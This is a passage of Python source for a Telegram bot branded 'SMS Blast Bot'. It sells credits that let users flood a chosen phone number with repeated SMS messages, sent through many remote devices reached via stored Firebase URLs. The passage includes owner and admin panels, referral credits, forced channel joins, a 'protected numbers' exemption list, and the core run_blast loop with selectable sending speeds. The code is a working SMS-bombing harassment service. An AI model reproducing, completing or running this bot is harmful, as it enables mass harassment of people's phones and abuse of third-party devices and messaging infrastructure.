        f"{em(EMOJI_SHIELD, '🛡')} <b>{sc('admin panel')}</b> — {_VERSION}\n\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{em(EMOJI_STAR, '👥')} ᴜsᴇʀs      : <b>{len(users)}</b>\n"
        f"{em(EMOJI_CROSS, '🚫')} ʙᴀɴɴᴇᴅ   : <b>{len(d.get('banned', []))}</b>\n"
        f"{em(EMOJI_CHECK, '📤')} sᴇɴᴛ     : <b>{stats.get('total_sent', 0)}</b>\n"
        f"{em(EMOJI_CROSS, '❌')} ғᴀɪʟᴇᴅ   : <b>{stats.get('total_failed', 0)}</b>\n"
        f"{em(EMOJI_ROCKET, '🚀')} ᴀᴄᴛɪᴠᴇ   : <b>{active}</b>\n"
        f"{em(EMOJI_FIRE, '🔥')} ғɪʀᴇʙᴀsᴇ : <b>{len(d.get('firebases', []))}</b>\n"
        f"{em(EMOJI_VIDEO, '📹')} ᴠɪᴅᴇᴏs    : <b>{len(d.get('videos', []))}</b>\n"
        f"{em(EMOJI_LOCK, '🔒')} ᴘʀᴏᴛᴇᴄᴛᴇᴅ: <b>{len(PROTECTED_NUMBERS)}</b>\n"
        f"{em(EMOJI_GIFT, '🔓')} ᴀᴄᴄᴇss   : {mode}\n"
        f"{em(EMOJI_GEAR, '🔄')} sᴄᴀɴɴᴇʀ : {get_scan_status()}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n{fb_sum}"
    )

def user_home_text(uid: int, d: dict) -> str:
    ud = d["users"].get(str(uid), {})
    fbs = d.get("firebases", [])
    return (
        f"{em(EMOJI_PHONE, '📱')} <b>sᴍs ʙʟᴀsᴛ {_VERSION}</b>\n"
        f"<b>Owner:</b> {SUPER_ADMIN_NAME}\n\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{em(EMOJI_STAR, '👤')} ʀᴏʟᴇ    : {role_tag(uid, d)}\n"
        f"{em(EMOJI_MONEY, '💰')} ᴄʀᴇᴅɪᴛs  : <b>{ud.get('credits', 0)}</b>\n"
        f"{em(EMOJI_STAR, '🔢')} ᴜsᴇs     : <b>{ud.get('uses', 0)}</b>\n"
        f"{em(EMOJI_FIRE, '🔥')} ᴀᴘɪs     : <b>{len(fbs)}</b>\n"
        f"{em(EMOJI_GEAR, '🔄')} sᴄᴀɴɴᴇʀ  : {get_scan_status()}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"ᴛᴀᴘ <b>{sc('send sms')}</b> ᴛᴏ sᴛᴀʀᴛ {em(EMOJI_ROCKET, '🚀')}"
    )

# ═══════════════════════════════════════════════════════════════
#                    MAIN KEYBOARDS
# ═══════════════════════════════════════════════════════════════

def owner_kb(d: dict) -> InlineKeyboardMarkup:
    mode_b = (
        (f"🔴 {sc('disable free mode')}", "owner:free:off")
        if d.get("free_mode")
        else (f"🟢 {sc('enable free mode')}", "owner:free:on")
    )
    return InlineKeyboardMarkup(inline_keyboard=[
        [btn("sᴇɴᴅ sᴍs", "owner:send", EMOJI_ROCKET, "📤"),
         btn("ғɪʀᴇʙᴀsᴇ", "owner:fb:menu:0", EMOJI_FIRE, "🔥")],
        [btn("ᴠɪᴅᴇᴏs", "owner:videos:menu", EMOJI_VIDEO, "📹"),
         btn("sᴜᴘᴇʀ ᴀᴅᴍɪɴs", "owner:owners:menu", EMOJI_CROWN, "👑")],
        [btn("ᴀᴅᴍɪɴs", "owner:admins:menu", EMOJI_SHIELD, "🛡"),
         btn("ᴜsᴇʀs", "owner:users:list", EMOJI_STAR, "👥")],
        [btn("ʙᴀɴ", "owner:ban", EMOJI_CROSS, "🚫"),
         btn("ᴜɴʙᴀɴ", "owner:unban:menu", EMOJI_CHECK, "✅")],
        [btn("ʙʀᴏᴀᴅᴄᴀsᴛ", "owner:broadcast", EMOJI_BELL, "📢"),
         btn("ᴀᴘɪ sᴛᴀᴛs", "owner:stats", EMOJI_STAR, "📊")],
        [btn("ᴀᴄᴛɪᴠɪᴛʏ", "owner:activity", EMOJI_GEAR, "📜"),
         btn("ᴘʀɪᴄɪɴɢ", "owner:pricing:menu", EMOJI_MONEY, "💳")],
        [btn("ʀᴇᴅᴇᴇᴍ", "owner:redeem:menu", EMOJI_GIFT, "🎁"),
         btn("ᴀᴅᴅ ᴄʀᴇᴅɪᴛs", "owner:credits:add", EMOJI_MONEY, "💰")],
        [btn("ᴅᴇᴅᴜᴄᴛ ᴄʀᴇᴅɪᴛs", "owner:credits:deduct", EMOJI_CROSS, "💸"),
         btn("ᴀᴅᴅ ᴀʟʟ", "owner:add_all_credits", EMOJI_MONEY, "💰")],
        [btn("ᴅᴇᴅᴜᴄᴛ ᴀʟʟ", "owner:deduct_all_credits", EMOJI_CROSS, "💸"),
         btn("ғᴏʀᴄᴇ ᴊᴏɪɴ", "owner:fj:menu", EMOJI_BELL, "🔗")],
        [btn("sᴇᴛᴛɪɴɢs", "owner:settings", EMOJI_GEAR, "⚙️"),
         btn("sᴍs ʜɪsᴛ", "owner:sms_history", EMOJI_STAR, "📋")],
        [btn("ᴇxᴘᴏʀᴛ", "owner:export_script", EMOJI_GEAR, "📤"),
         btn("ᴘʀᴏᴛᴇᴄᴛ", "owner:protect", EMOJI_LOCK, "🔒")],
        [btn("ᴘʀᴏᴛ ʟɪsᴛ", "owner:protected_list", EMOJI_LOCK, "🔐"),
         btn("ᴛʀᴀᴄᴋ", "owner:track", EMOJI_STAR, "📊")],
        [InlineKeyboardButton(text=mode_b[0], callback_data=mode_b[1])],
        [btn("ʀᴇғʀᴇsʜ", "owner:refresh", EMOJI_GEAR, "🔄")],
    ])

def admin_kb(d: dict) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [btn("sᴇɴᴅ sᴍs", "admin:send", EMOJI_ROCKET, "📤"),
         btn("ᴠɪᴅᴇᴏs", "owner:videos:menu", EMOJI_VIDEO, "📹")],
        [btn("ᴜsᴇʀs", "admin:users:list", EMOJI_STAR, "👥"),
         btn("sᴛᴀᴛs", "admin:stats", EMOJI_STAR, "📊")],
        [btn("ʙᴀɴ", "admin:ban", EMOJI_CROSS, "🚫"),
         btn("ᴜɴʙᴀɴ", "admin:unban:menu", EMOJI_CHECK, "✅")],
        [btn("ʙʀᴏᴀᴅᴄᴀsᴛ", "admin:broadcast", EMOJI_BELL, "📢")],
        [btn("ʀᴇғʀᴇsʜ", "admin:refresh", EMOJI_GEAR, "🔄")],
    ])

def user_kb() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [btn("sᴇɴᴅ sᴍs", "user:send", EMOJI_ROCKET, "📤")],
        [btn("ᴠɪᴅᴇᴏs", "user:random_video", EMOJI_VIDEO, "📹"),
         btn("ᴄʀᴇᴅɪᴛs", "user:credits", EMOJI_MONEY, "💳")],
        [btn("ʀᴇᴅᴇᴇᴍ", "user:redeem", EMOJI_GIFT, "🎁"),
         btn("ʀᴇғᴇʀ", "user:refer", EMOJI_STAR, "👥")],
        [btn("sᴛᴀᴛs", "user:stats", EMOJI_STAR, "📊"),
         btn("sᴍs ʜɪsᴛ", "user:sms_history", EMOJI_STAR, "📜")],
        [btn("ʙᴜʏ ᴄʀᴇᴅɪᴛs", "user:pricing", EMOJI_MONEY, "💰")],
        [btn("ᴛʀᴀɴsғᴇʀ", "user:transfer", EMOJI_MONEY, "💸")],
        [btn("ɪɴғᴏ", "user:info", EMOJI_GEAR, "ℹ️")],
    ])

def videos_menu_kb(d: dict) -> InlineKeyboardMarkup:
    vids = d.get("videos", [])
    rows = [
        [btn("ᴀᴅᴅ ᴠɪᴅᴇᴏ", "owner:videos:add", EMOJI_CHECK, "➕")],
        [btn("ʙᴜʟᴋ ᴅᴇʟ", "owner:videos:bulk_del", EMOJI_CROSS, "🗑")],
    ]
    for i, _ in enumerate(vids, 1):
        rows.append([
            btn(f"ᴠɪᴅᴇᴏ #{i}", "noop", EMOJI_VIDEO, "📹"),
            btn("ʀᴇᴍ", f"owner:videos:del:{i - 1}", EMOJI_CROSS, "🗑"),
        ])
    rows.append([btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

def fb_menu_kb(d: dict, page: int = 0) -> InlineKeyboardMarkup:
    fbs = d.get("firebases", [])
    per = 8
    tp = max(1, (len(fbs) + per - 1) // per)
    page = max(0, min(page, tp - 1))
    cur = fbs[page * per : (page + 1) * per]
    rows = [
        [btn("ᴀᴅᴅ", "owner:fb:add", EMOJI_CHECK, "➕"),
         btn("ᴀᴅᴅ ᴛxᴛ", "owner:fb:add_file", EMOJI_CHECK, "📄")],
    ]
    for fb in cur:
        lbl = fb.get("label", fb["url"].replace("https://", ""))
        if len(lbl) > 16:
            lbl = lbl[:14] + ".."
        rows.append([
            btn(lbl, "noop", EMOJI_FIRE, "🔥"),
            btn("ʀᴇᴍ", f"owner:fb:del:{fb['id']}:{page}", EMOJI_CROSS, "🗑"),
        ])
    nav = []
    if page > 0:
        nav.append(btn("◀️", f"owner:fb:menu:{page - 1}", EMOJI_GEAR, "◀️"))
    if page < tp - 1:
        nav.append(btn("▶️", f"owner:fb:menu:{page + 1}", EMOJI_GEAR, "▶️"))
    if nav:
        rows.append(nav)
    rows.append([btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

def owners_menu_kb(d: dict) -> InlineKeyboardMarkup:
    owners = d.get("owners", [])
    rows = []
    if len(owners) < 6:
        rows.append([btn("ᴀᴅᴅ sᴜᴘᴇʀ ᴀᴅᴍɪɴ", "owner:owners:add", EMOJI_CHECK, "➕")])
    for oid in owners:
        if oid == MAIN_OWNER:
            rows.append([btn(f"{oid} (ᴍᴀɪɴ)", "noop", EMOJI_CROWN, "👑")])
        else:
            rows.append([
                btn(f"{oid}", "noop", EMOJI_CROWN, "🔱"),
                btn("ʀᴇᴍ", f"owner:owners:del:{oid}", EMOJI_CROSS, "🗑"),
            ])
    rows.append([btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

def admins_menu_kb(d: dict) -> InlineKeyboardMarkup:
    rows = [[btn("ᴀᴅᴅ ᴀᴅᴍɪɴ", "owner:admins:add", EMOJI_CHECK, "➕")]]
    for aid in d.get("admins", []):
        rows.append([
            btn(f"{aid}", "noop", EMOJI_SHIELD, "🛡"),
            btn("ʀᴇᴍ", f"owner:admins:del:{aid}", EMOJI_CROSS, "🗑"),
        ])
    rows.append([btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

def unban_menu_kb(d: dict, prefix: str) -> InlineKeyboardMarkup:
    rows = [
        [btn(f"{bid}", f"{prefix}:unban:do:{bid}", EMOJI_CHECK, "🔓")]
        for bid in d.get("banned", [])
    ]
    rows.append([btn("ʙᴀᴄᴋ", f"{prefix}:home", EMOJI_GEAR, "🔙")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

def users_list_kb(d: dict, prefix: str, page: int = 0):
    users = d.get("users", {})
    items = list(users.items())
    per = 10
    start = page * per
    chunk = items[start : start + per]
    banned = d.get("banned", [])
    approved = d.get("approved", [])
    lines = [f"{em(EMOJI_STAR, '👥')} <b>{sc('users')} ({len(items)} ᴛᴏᴛᴀʟ)</b>\n"]
    for uid_str, ud in chunk:
        uid = int(uid_str)
        nm = ud.get("name", "Unknown")
        if uid in banned:
            st = em(EMOJI_CROSS, "🚫")
        elif uid in approved:
            st = em(EMOJI_CHECK, "✅")
        elif is_owner(uid, d):
            st = em(EMOJI_CROWN, "👑")
        elif uid in d["admins"]:
            st = em(EMOJI_SHIELD, "🛡")
        else:
            st = em(EMOJI_STAR, "👤")
        lines.append(
            f"{st} <code>{uid}</code> — {nm[:18]} | 💰{ud.get('credits', 0)} | 📤{ud.get('uses', 0)}"
        )
    rows = []
    nav = []
    if page > 0:
        nav.append(btn("◀️", f"{prefix}:users:pg:{page - 1}", EMOJI_GEAR, "◀️"))
    if start + per < len(items):
        nav.append(btn("▶️", f"{prefix}:users:pg:{page + 1}", EMOJI_GEAR, "▶️"))
    if nav:
        rows.append(nav)
    rows.append([btn("ʙᴀᴄᴋ", f"{prefix}:home", EMOJI_GEAR, "🔙")])
    return "\n".join(lines), InlineKeyboardMarkup(inline_keyboard=rows)

def api_stats_text(d: dict) -> str:
    stats = d.get("stats", {})
    api = stats.get("api_usage", {})
    fbs = {fb["id"]: fb for fb in d.get("firebases", [])}
    lines = [
        f"{em(EMOJI_STAR, '📊')} <b>{sc('api stats')}</b>\n",
        f"{em(EMOJI_CHECK, '📤')} ᴛᴏᴛᴀʟ sᴇɴᴛ  : <b>{stats.get('total_sent', 0)}</b>",
        f"{em(EMOJI_CROSS, '❌')} ᴛᴏᴛᴀʟ ғᴀɪʟᴇᴅ: <b>{stats.get('total_failed', 0)}</b>\n",
        "━━━━━━━━━━━━━━━━━━━━━━",
        f"<b>{sc('per firebase:')}</b>",
    ]
    if not api:
        lines.append(f"  {em(EMOJI_WARNING, '😴')} ɴᴏ ᴜsᴀɢᴇ.")
    for fid, fs in api.items():
        fb = fbs.get(fid)
        lbl = fb.get("label", fid[:20]) if fb else fid[:20]
        lbl = lbl.replace("<", "&lt;").replace(">", "&gt;").replace("&", "&amp;")
        lines.append(
            f"{em(EMOJI_FIRE, '🔥')} {lbl}\n"
            f"   ✅ {fs.get('sent', 0)} sᴇɴᴛ  ❌ {fs.get('failed', 0)} ғᴀɪʟᴇᴅ"
        )
    return "\n".join(lines)

# ═══════════════════════════════════════════════════════════════
#                      ROUTER
# ═══════════════════════════════════════════════════════════════

R = Router()

# ═══════════════════════════════════════════════════════════════
#                      /start HANDLERS
# ═══════════════════════════════════════════════════════════════

async def _do_start(msg: Message, state: FSMContext, ref_code: str = ""):
    await state.clear()
    uid = msg.from_user.id
    asyncio.create_task(send_fire_effect_private(msg.bot, msg.chat.id))
    name = msg.from_user.full_name or "User"
    uname = f"@{msg.from_user.username}" if msg.from_user.username else "No Username"
    d = load()
    is_new = reg_user(uid, name, d)

    if is_new:
        asyncio.create_task(send_channel_log(
            msg.bot,
            f"🆕 <b>NEW USER</b>\n\n"
            f"👤 {name}\n"
            f"🆔 <code>{uid}</code>\n"
            f"🌐 {uname}\n"
            f"📅 {fmt_time(int(time.time()))}"
        ))

    if ref_code.startswith("REF") and not d["users"].get(str(uid), {}).get("referred_by"):
        ok, _, ref = process_referral(uid, ref_code, d)
        if ok and ref:
            try:
                await msg.bot.send_message(
                    ref,
                    f"{em(EMOJI_GIFT, '🎉')} <b>Referral use hua!</b>\n"
                    f"+{d['settings']['ref_credits']} credits mile.",
                    parse_mode="HTML",
                )
            except:
                pass
    save(d)

    joined, missing = await user_joined_all(msg.bot, uid, d)
    if not joined:
        await msg.answer(
            force_join_text(missing),
            reply_markup=force_join_kb(missing),
            parse_mode="HTML",
            disable_web_page_preview=True,
        )
        return

    await send_random_video(
        msg.bot, msg.chat.id,
        caption=f"{em(EMOJI_ROCKET, '🚀')} Welcome to SMS Blast Bot!\nOwner: {SUPER_ADMIN_NAME}"
    )

    if is_owner(uid, d):
        await msg.answer(owner_panel_text(d), reply_markup=owner_kb(d), parse_mode="HTML")
        try:
            await msg.answer("⚡ Quick menu:", reply_markup=owner_menu())
        except:
            pass
        return

    if is_admin(uid, d):
        await msg.answer(admin_panel_text(d), reply_markup=admin_kb(d), parse_mode="HTML")
        try:
            await msg.answer("⚡ Quick menu:", reply_markup=owner_menu())
        except:
            pass
        return

    if is_banned(uid, d):
        await msg.answer(
            f"{em(EMOJI_CROSS, '🚫')} <b>Aapko ban kar diya gaya hai.</b>",
            parse_mode="HTML",
        )
        return

    if not can_use(uid, d):
        await msg.answer(
            f"{em(EMOJI_CROSS, '⛔')} <b>Access nahi hai!</b>\nOwner se approval lein.",
            parse_mode="HTML",
        )
        return

    await msg.answer(user_home_text(uid, d), reply_markup=user_kb(), parse_mode="HTML")
    try:
        await msg.answer("⚡ Quick menu:", reply_markup=main_menu())
    except:
        pass

@R.message(CommandStart(deep_link=True))
async def cmd_start_deep(msg: Message, state: FSMContext, command: CommandObject):
    code = command.args or ""
    await _do_start(msg, state, code)

@R.message(CommandStart())
async def cmd_start(msg: Message, state: FSMContext):
    await _do_start(msg, state)

@R.callback_query(F.data == "fj:check")
async def fj_check(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    joined, missing = await user_joined_all(cq.bot, uid, d)
    if not joined:
        await cq.answer("❌ Abhi join nahi kiya!", show_alert=True)
        try:
            await cq.message.edit_text(
                force_join_text(missing),
                reply_markup=force_join_kb(missing),
                parse_mode="HTML",
                disable_web_page_preview=True,
            )
        except:
            pass
        return
    await cq.answer("✅ Verified!")
    if is_owner(uid, d):
        await cq.message.answer(owner_panel_text(d), reply_markup=owner_kb(d), parse_mode="HTML")
    elif is_admin(uid, d):
        await cq.message.answer(admin_panel_text(d), reply_markup=admin_kb(d), parse_mode="HTML")
    else:
        await cq.message.answer(user_home_text(uid, d), reply_markup=user_kb(), parse_mode="HTML")

# ═══════════════════════════════════════════════════════════════
#                      USER SEND FLOW
# ═══════════════════════════════════════════════════════════════

@R.callback_query(F.data == "user:send")
async def user_send_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    joined, missing = await user_joined_all(cq.bot, uid, d)
    if not joined:
        await cq.answer("⛔ Force Join!", show_alert=True)
        await cq.message.edit_text(
            force_join_text(missing),
            reply_markup=force_join_kb(missing),
            parse_mode="HTML",
        )
        return
    if not can_use(uid, d):
        await cq.answer("🚫 Access denied!", show_alert=True)
        return
    await state.set_state(S.send_number)
    await cq.message.edit_text(
        f"{em(EMOJI_PHONE, '📞')} <b>{sc('step 1/4')} — {sc('number')}</b>\n\n"
        f"Number enter karo:\n<i>Example: +919876543210</i>",
        reply_markup=kb([(sc("cancel"), "user:home")]),
        parse_mode="HTML",
    )

@R.message(S.send_number)
async def user_got_number(msg: Message, state: FSMContext):
    n = msg.text.strip()
    if not n.replace("+", "").replace(" ", "").isdigit() or len(n) < 7:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Invalid number!", parse_mode="HTML")
        return
    if n in PROTECTED_NUMBERS:
        await msg.answer(f"{em(EMOJI_LOCK, '🔒')} Ye number protected hai!", parse_mode="HTML")
        return
    await state.update_data(number=n)
    await state.set_state(S.send_message)
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} <code>{mask_number(n)}</code>\n\n"
        f"{em(EMOJI_STAR, '💬')} <b>{sc('step 2/4')} — {sc('message')}</b>",
        reply_markup=kb([(sc("cancel"), "user:cancel")]),
        parse_mode="HTML",
    )

@R.message(S.send_message)
async def user_got_message(msg: Message, state: FSMContext):
    await state.update_data(message=msg.text.strip())
    await state.set_state(S.send_speed)
    await msg.answer(
        f"{em(EMOJI_ROCKET, '⚡')} <b>{sc('step 3/4')} — {sc('speed')}</b>",
        reply_markup=speed_kb("user"),
        parse_mode="HTML",
    )

@R.callback_query(F.data.in_({"user:speed:fast", "user:speed:medium", "user:speed:slow"}))
async def user_speed_sel(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    sm = {
        "user:speed:fast": SPEED_FAST,
        "user:speed:medium": SPEED_MEDIUM,
        "user:speed:slow": SPEED_SLOW,
    }
    sp = sm.get(cq.data, SPEED_MEDIUM)
    lbl = (
        "🚀 FAST" if sp == SPEED_FAST
        else "⚡ MEDIUM" if sp == SPEED_MEDIUM
        else "🐢 SLOW"
    )
    await state.update_data(send_speed=sp)
    await state.set_state(S.send_count)
    devs = get_cached_devices() or await get_all_online_devices(d)
    ci = ""
    if not is_admin(uid, d):
        ci = f"\n{em(EMOJI_MONEY, '💰')} Credits: <b>{get_credits(uid, d)}</b>"
    await cq.message.edit_text(
        f"{lbl} <b>selected!</b>\n\n"
        f"{em(EMOJI_STAR, '📊')} <b>{sc('step 4/4')} — {sc('count')}</b>\n\n"
        f"{em(EMOJI_FIRE, '🔥')} APIs: <b>{len(devs)}</b>\n"
        f"{em(EMOJI_CHECK, '📤')} Capacity: <b>{len(devs) * 3}</b>{ci}\n\n"
        f"Kitne SMS?",
        reply_markup=kb([(sc("cancel"), "user:cancel")]),
        parse_mode="HTML",
    )

@R.message(S.send_count)
async def user_got_count(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    fsmd = await state.get_data()
    try:
        cnt = int(msg.text.strip())
        assert cnt >= 1
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Sirf number bhejo!", parse_mode="HTML")
        return
    await state.clear()
    num = fsmd.get("number", "")
    m = fsmd.get("message", "")
    sp = fsmd.get("send_speed", SPEED_DEFAULT)
    if not is_admin(uid, d):
        cur = get_credits(uid, d)
        if cur <= 0:
            await msg.answer(
                f"{em(EMOJI_CROSS, '❌')} <b>Credits nahi hain!</b>",
                reply_markup=kb([(sc("home"), "user:home")]),
                parse_mode="HTML",
            )
            return
        if cnt > cur:
            cnt = cur
    devs = get_cached_devices() or await get_all_online_devices(d)
    if not devs:
        await msg.answer(
            f"{em(EMOJI_WARNING, '😴')} Koi API online nahi!",
            reply_markup=kb([(sc("home"), "user:home")]),
            parse_mode="HTML",
        )
        return
    await run_blast(msg.bot, msg, uid, num, m, cnt, devs, sp)
    # ═══════════════════════════════════════════════════════════════
#                    BLAST ENGINE (CORE)
# ═══════════════════════════════════════════════════════════════

async def run_blast(
    bot: Bot, msg: Message, uid: int, number: str, message: str,
    count: int, devices: list, speed: float = SPEED_DEFAULT
):
    await send_random_video(
        bot, msg.chat.id,
        caption=f"💣 <b>Blast on {mask_number(number)}!</b>"
    )

    async with SESSIONS_LOCK:
        if uid in USER_SESSIONS and USER_SESSIONS[uid].task and not USER_SESSIONS[uid].task.done():
            await msg.answer(
                f"{em(EMOJI_WARNING, '⚠️')} Ek sending already chal rahi hai!",
                parse_mode="HTML",
            )
            return
        sess = UserSession(uid)
        sess.number = number
        USER_SESSIONS[uid] = sess

    is_reg = not is_admin(uid, load()) and not is_owner(uid, load())
    lbl = (
        "🚀 FAST" if speed == SPEED_FAST
        else "⚡ MEDIUM" if speed == SPEED_MEDIUM
        else "🐢 SLOW"
    )

    try:
        prog = await msg.answer(
            progress_text(
                0, 0, count,
                get_credits(uid, load()) if is_reg else None,
                lbl
            ),
            reply_markup=stop_send_kb(),
            parse_mode="HTML",
        )
    except Exception as e:
        log.error(f"Progress msg: {e}")
        async with SESSIONS_LOCK:
            USER_SESSIONS.pop(uid, None)
        return

    sent = 0
    fail = 0
    left = count
    usage = {}
    last_update = time.time()
    t0 = time.time()

    async def do_send():
        nonlocal sent, fail, left, last_update
        try:
            for dev in devices:
                if left <= 0:
                    break
                async with sess.lock:
                    if sess.cancelled:
                        break

                slots = (
                    [s.get("simSlotIndex", 0) for s in dev["sims"]]
                    if dev["sims"] else [0]
                )
                dev_sent = 0

                for sim in slots:
                    async with sess.lock:
                        if dev_sent >= 3 or left <= 0 or sess.cancelled:
                            break

                    ok = await send_sms_via_device(
                        dev["fb_url"], dev["dev_id"], sim, number, message
                    )

                    async with sess.lock:
                        if ok:
                            sent += 1
                            dev_sent += 1
                            left -= 1
                            if is_reg:
                                dd = load()
                                deduct_credits(uid, 1, dd)
                                dd["stats"]["total_sent"] = dd["stats"].get("total_sent", 0) + 1
                                dd["users"].setdefault(str(uid), {}).setdefault("uses", 0)
                                dd["users"][str(uid)]["uses"] += 1
                                dd.setdefault("sms_history", {}).setdefault(str(uid), []).append({
                                    "number": number,
                                    "message": message[:100],
                                    "timestamp": int(time.time()),
                                    "status": "sent",
                                })
                                save(dd)
                        else:
                            fail += 1
                            left -= 1

                        fid = dev["fb_id"]
                        if fid not in usage:
                            usage[fid] = {"sent": 0, "failed": 0}
                        usage[fid]["sent" if ok else "failed"] += 1

                        now = time.time()
                        if (
                            now - last_update >= _PROGRESS_UPDATE_INTERVAL
                            or (sent + fail) == count
                            or sess.cancelled
                        ):
                            try:
                                cr = get_credits(uid, load()) if is_reg else None
                                await prog.edit_text(
                                    progress_text(sent, fail, count, cr, lbl),
                                    reply_markup=(
                                        stop_send_kb() if not sess.cancelled else None
                                    ),
                                    parse_mode="HTML",
                                )
                            except TelegramBadRequest:
                                pass
                            last_update = now

                    await asyncio.sleep(speed)

        except Exception as e:
            log.error(f"Send loop {uid}: {e}")
        finally:
            async with sess.lock:
                sess.sent = sent
                sess.failed = fail

    task = asyncio.create_task(do_send())
    sess.task = task
    try:
        await task
    except Exception as e:
        log.error(f"Task: {e}")

    cancelled = sess.cancelled
    async with SESSIONS_LOCK:
        USER_SESSIONS.pop(uid, None)

    df = load()
    df["stats"]["total_sent"] = df["stats"].get("total_sent", 0) + sent
    df["stats"]["total_failed"] = df["stats"].get("total_failed", 0) + fail
    for fid, dv in usage.items():
        df["stats"].setdefault("api_usage", {}).setdefault(fid, {"sent": 0, "failed": 0})
        df["stats"]["api_usage"][fid]["sent"] += dv["sent"]
        df["stats"]["api_usage"][fid]["failed"] += dv["failed"]
    df["users"].setdefault(str(uid), {}).setdefault("uses", 0)
    df["users"][str(uid)]["uses"] += sent
    df.setdefault("sms_history", {}).setdefault(str(uid), []).append({
        "number": number,
        "message": message[:100],
        "timestamp": int(time.time()),
        "status": "completed" if not cancelled else "stopped",
    })
    log_activity(
        df, "sms_blast", uid,
        f"Sent:{sent} Fail:{fail} Dur:{fmt_duration(int(time.time() - t0))} Stop:{cancelled}"
    )
    save(df)

    try:
        uc = await bot.get_chat(uid)
        uname = uc.full_name or "Unknown"
        uu = f"@{uc.username}" if uc.username else "N/A"
    except:
        uname = "Unknown"
        uu = "N/A"

    asyncio.create_task(send_channel_log(
        bot,
        f"🚀 <b>BLAST LOG</b>\n\n"
        f"👤 {uname}\n"
        f"🆔 <code>{uid}</code>\n"
        f"🌐 {uu}\n"
        f"📞 <code>{number}</code>\n"
        f"💬 <code>{message}</code>\n"
        f"✅ {sent}  ❌ {fail}  📊 {count}\n"
        f"⏱ {fmt_duration(int(time.time() - t0))}\n"
        f"🛑 {'STOPPED' if cancelled else 'COMPLETED'}"
    ))

    icon = (
        em(EMOJI_CHECK, "✅") if fail == 0 and sent > 0
        else em(EMOJI_WARNING, "⚠️") if sent > 0
        else em(EMOJI_CROSS, "❌")
    )
    ct = ""
    if is_reg:
        ct = (
            f"\n{em(EMOJI_MONEY, '💰')} Used: <b>{sent}</b>\n"
            f"{em(EMOJI_MONEY, '💳')} Left: <b>{get_credits(uid, load())}</b>"
        )
    stp = (
        f"\n{em(EMOJI_CROSS, '🛑')} <b>Stopped by user!</b>"
        if cancelled else ""
    )

    if is_owner(uid, load()):
        back = [btn("ᴏᴡɴᴇʀ", "owner:home", EMOJI_GEAR, "🔙")]
    elif is_admin(uid, load()):
        back = [btn("ᴀᴅᴍɪɴ", "admin:home", EMOJI_GEAR, "🔙")]
    else:
        back = [
            btn("sᴇɴᴅ ᴍᴏʀᴇ", "user:send", EMOJI_ROCKET, "📤"),
            btn("ʜᴏᴍᴇ", "user:home", EMOJI_STAR, "🏠"),
        ]

    try:
        await prog.edit_text(
            f"{icon} <b>Result</b>{stp}\n\n"
            f"{em(EMOJI_PHONE, '📞')} {mask_number(number)}\n"
            f"{em(EMOJI_STAR, '💬')} {message[:50]}\n"
            f"{em(EMOJI_CHECK, '✅')} Sent: <b>{sent}</b>\n"
            f"{em(EMOJI_CROSS, '❌')} Failed: <b>{fail}</b>\n"
            f"{em(EMOJI_GEAR, '⏱')} {fmt_duration(int(time.time() - t0))}{ct}",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[back]),
            parse_mode="HTML",
        )
    except:
        pass

@R.callback_query(F.data == "user:stop_send")
async def user_stop(cq: CallbackQuery, state: FSMContext):
    uid = cq.from_user.id
    async with SESSIONS_LOCK:
        sess = USER_SESSIONS.get(uid)
        if not sess or (sess.task and sess.task.done()):
            await cq.answer("✅ Already complete!", show_alert=True)
            return
        sess.cancelled = True
    await cq.answer("🛑 Stop signal bheja!", show_alert=True)

# ═══════════════════════════════════════════════════════════════
#                    OWNER / ADMIN SEND FLOW
# ═══════════════════════════════════════════════════════════════

@R.callback_query(F.data == "owner:send")
async def owner_send_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner only!", show_alert=True)
        return
    await state.set_state(S.owner_send_number)
    await cq.message.edit_text(
        f"{em(EMOJI_CROWN, '👑')} <b>Owner SMS</b>\n\n"
        f"{em(EMOJI_PHONE, '📞')} <b>{sc('step 1/4')} — {sc('number')}</b>",
        reply_markup=kb([(sc("cancel"), "owner:home")]),
        parse_mode="HTML",
    )

@R.callback_query(F.data == "admin:send")
async def admin_send_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫 Admin only!", show_alert=True)
        return
    await state.set_state(S.admin_send_number)
    await cq.message.edit_text(
        f"{em(EMOJI_SHIELD, '🛡')} <b>Admin SMS</b>\n\n"
        f"{em(EMOJI_PHONE, '📞')} <b>{sc('step 1/4')} — {sc('number')}</b>",
        reply_markup=kb([(sc("cancel"), "admin:home")]),
        parse_mode="HTML",
    )

async def _got_number(msg: Message, state: FSMContext, role: str):
    n = msg.text.strip()
    if not n.replace("+", "").replace(" ", "").isdigit() or len(n) < 7:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Invalid!", parse_mode="HTML")
        return
    if role == "admin" and n in PROTECTED_NUMBERS:
        pr = PROTECTED_NUMBERS[n]
        if not is_owner(msg.from_user.id, load()) and msg.from_user.id != pr:
